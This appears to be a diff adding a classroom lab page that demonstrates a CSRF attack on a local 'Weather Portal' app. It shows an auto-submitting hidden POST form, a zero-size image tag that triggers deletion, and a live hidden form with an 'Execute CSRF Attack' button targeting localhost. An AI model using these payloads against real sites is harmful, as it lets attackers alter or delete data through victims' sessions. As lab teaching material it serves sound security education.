@@ -1,0 +1,72 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>CSRF Attack Demo - Weather Portal Lab</title>
+    <style>
+        body { font-family: 'Segoe UI', sans-serif; background: #1a1a2e; color: #eee; padding: 40px; }
+        .container { max-width: 800px; margin: 0 auto; background: #16213e; padding: 30px; border-radius: 10px; }
+        h1 { color: #e94560; }
+        h2 { color: #4cd137; border-bottom: 2px solid #e94560; padding-bottom: 10px; }
+        .payload { background: #0f3460; padding: 15px; border-radius: 6px; margin: 15px 0; overflow-x: auto; }
+        code { color: #00d9ff; font-family: 'Courier New', monospace; }
+        .warning { background: #e94560; color: #fff; padding: 15px; border-radius: 6px; margin: 20px 0; }
+        .btn { display: inline-block; padding: 10px 20px; background: #e94560; color: #fff; text-decoration: none; border-radius: 6px; margin-top: 10px; border: none; cursor: pointer; font-size: 16px;}
+        .btn:hover { background: #c13651; }
+        .hidden-form { opacity: 0; position: absolute; top: 0; left: 0; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>🎯 CSRF Attack Lab - Shifat's Malicious Weather Page</h1>
+
+        <div class="warning">
+            <strong>⚠️ LAB SCENARIO:</strong> User "shifat" cannot directly edit other weather stations' reports due to basic checks. 
+            However, because the Weather Portal has NO CSRF tokens, shifat can force a logged-in operator/admin to unknowingly modify or delete weather records!
+        </div>
+
+        <h2>📋 Attack Scenario</h2>
+        <p><strong>Attacker:</strong> shifat (Station Operator - restricted access)</p>
+        <p><strong>Victim:</strong> admin or primary operator (must be logged in)</p>
+        <p><strong>Goal:</strong> Force victim to update weather info to fake data or delete a crucial report unknowingly.</p>
+
+        <h2>🛠️ Method 1: Hidden Auto-Submit Form (POST Request to edit_report.php)</h2>
+        <p>This form can auto-submit when the victim visits this page while logged in:</p>
+        <div class="payload">
+<code>&lt;form id="csrf-form" action="http://localhost/weather/edit_report.php?id=1" method="POST"&gt;
+    &lt;input type="hidden" name="city" value="FAKE DHAKA"&gt;
+    &lt;input type="hidden" name="temp" value="99°C"&gt;
+    &lt;input type="hidden" name="cond" value="Modified via CSRF Attack by Shifat!"&gt;
+&lt;/form&gt;
+&lt;script&gt;document.getElementById('csrf-form').submit();&lt;/script&gt;</code>
+        </div>
+
+        <form id="csrf-form" action="http://localhost/weather/edit_report.php?id=1" method="POST" class="hidden-form">
+            <input type="hidden" name="city" value="FAKE DHAKA - CSRF SUCCESS!">
+            <input type="hidden" name="temp" value="99°C">
+            <input type="hidden" name="cond" value="Warning: This station data was modified via a CSRF exploit. Shifat bypassed authorization by forcing the victim session to submit this update.">
+        </form>
+
+        <h2>🛠️ Method 2: Image Tag GET Request (For delete_report.php)</h2>
+        <p>For actions that use GET (like delete_report.php), a stealthy image tag can trigger immediate deletion:</p>
+        <div class="payload">
+<code>&lt;img src="http://localhost/weather/delete_report.php?id=1" width="0" height="0"&gt;</code>
+        </div>
+
+        <h2>🚀 Execute the Attack</h2>
+        <p><strong>Steps to demonstrate in Lab:</strong></p>
+        <ol>
+            <li>Login to the <strong>Weather Portal</strong> as <strong>admin</strong> or any authentic user in one browser window.</li>
+            <li>Open this attack page (`attack.html`) in another tab.</li>
+            <li>Click the execution button below.</li>
+            <li>Go back to the Weather Portal Home — Report ID 1 will be completely modified using the Admin's authorization!</li>
+        </ol>
+
+        <button class="btn" onclick="document.getElementById('csrf-form').submit();">🔥 Execute CSRF Attack</button>
+
+        <div style="margin-top: 30px; padding: 15px; background: #533483; border-radius: 6px;">
+            <strong>💡 Why this works:</strong> The browser automatically attaches the victim's valid session cookie when making the request to `edit_report.php`. Since the Weather Portal doesn't require an anti-CSRF token, it trusts the request blindly!
+        </div>
+    </div>
+</body>
+</html>
